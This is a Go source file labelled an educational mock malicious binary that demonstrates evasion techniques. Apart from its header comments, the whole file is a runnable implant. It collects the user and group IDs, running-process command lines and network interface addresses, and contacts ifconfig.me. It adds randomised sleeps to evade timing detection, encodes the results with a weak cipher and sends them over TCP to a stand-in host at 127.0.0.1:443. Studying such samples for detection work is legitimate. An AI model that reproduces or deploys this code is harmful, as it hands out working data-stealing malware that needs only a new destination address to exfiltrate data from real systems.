// EDUCATIONAL MOCK MALICIOUS BINARY (Obfuscated)
// Purpose: Realistic evasion demonstration with stripped symbols
// Combines: Timing, low-entropy crypto, custom shells
// DO NOT USE FOR MALICIOUS PURPOSES

package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"syscall"
	"time"
)

// e1 - Low-entropy encryption
func e1(d string, k int) string {
	r := ""
	for _, c := range d {
		e := (int(c) * 3) + k
		r += string(rune(e % 256))
	}
	return r
}

// fn1 - User enumeration
func fn1() string {
	u := syscall.Getuid()
	g := syscall.Getgid()
	return fmt.Sprintf("u%dg%d", u, g)
}

// fn2 - Process enumeration
func fn2() string {
	r := ""

	if runtime.GOOS == "linux" {
		f, _ := os.ReadDir("/proc")
		c := 0
		for _, e := range f {
			if e.IsDir() && c < 5 {
				p := e.Name()
				cl, err := os.ReadFile("/proc/" + p + "/cmdline")
				if err == nil && len(cl) > 0 {
					r += fmt.Sprintf("p%s:%s;", p, string(cl))
					c++
				}
			}
		}
	}

	return r
}

// fn3 - Network enumeration
func fn3() string {
	r := ""

	i, err := net.Interfaces()
	if err != nil {
		return r
	}

	for _, iface := range i {
		a, _ := iface.Addrs()
		for _, addr := range a {
			r += fmt.Sprintf("n%s:%s;", iface.Name, addr.String())
		}
	}

	return r
}

// fn4 - External IP check
func fn4() string {
	c, err := net.Dial("tcp", "ifconfig.me:80")
	if err != nil {
		return ""
	}
	defer c.Close()

	req := "GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n"
	c.Write([]byte(req))

	b := make([]byte, 1024)
	n, _ := c.Read(b)

	return fmt.Sprintf("ext%d", n)
}

// d1 - Timing randomization
func d1() int {
	return rand.Intn(11) + 5
}

// x1 - Exfiltration
func x1(d string) {
	c, err := net.Dial("tcp", "127.0.0.1:443")
	if err != nil {
		return
	}
	defer c.Close()

	e := e1(d, 42)
	c.Write([]byte(e))
}

func main() {
	rand.Seed(time.Now().UnixNano() + int64(os.Getpid()))

	var data string

	// Op 1
	data += fn1() + "|"
	time.Sleep(time.Duration(d1()) * time.Second)

	// Op 2
	data += fn2() + "|"
	time.Sleep(time.Duration(d1()) * time.Second)

	// Op 3
	data += fn3() + "|"
	time.Sleep(time.Duration(d1()) * time.Second)

	// Op 4
	data += fn4()
	time.Sleep(time.Duration(d1()) * time.Second)

	// Exfil
	x1(data)
}
